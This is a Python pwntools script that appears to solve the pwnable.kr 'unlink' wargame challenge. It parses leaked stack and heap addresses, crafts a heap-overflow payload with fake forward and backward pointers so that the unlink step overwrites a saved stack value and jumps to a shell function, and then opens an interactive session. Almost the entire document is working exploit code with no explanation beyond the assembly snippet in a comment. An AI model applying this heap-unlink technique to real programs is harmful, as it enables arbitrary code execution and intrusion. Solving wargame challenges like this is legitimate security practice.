from pwn import *
import re

#s =  ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
#p = s.process('./unlink')
p = process('./unlink')

# (size) - fd - bk - data x 5

line = p.recv(1024)
stack, heap = re.findall(r'0x[0-9a-f]+', line.decode('utf-8'))
print("stack: " + stack)
print("heap: " + heap)
stack = int(stack, 16)
heap = int(heap, 16)

bpAddr = p32(stack - 0x1c)
shell = p32(0x080484eb)
size = p32(0x21)

"""
=> 0x80485ff <main+208>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x8048602 <main+211>:	leave  
   0x8048603 <main+212>:	lea    esp,[ecx-0x4]
   0x8048606 <main+215>:	ret    
"""

FD_falso = b'AAAA' * 2
addr_de_FD_falso = p32(heap + 0x30)
ecx = p32(heap + 0x3c)
esp = p32(heap + 0x3c)
payload = b'AAAA' * 5 + size + addr_de_FD_falso + bpAddr + b'BBBB' + ecx + FD_falso + shell

#gdb.attach(p)
p.sendline(payload)

p.interactive()

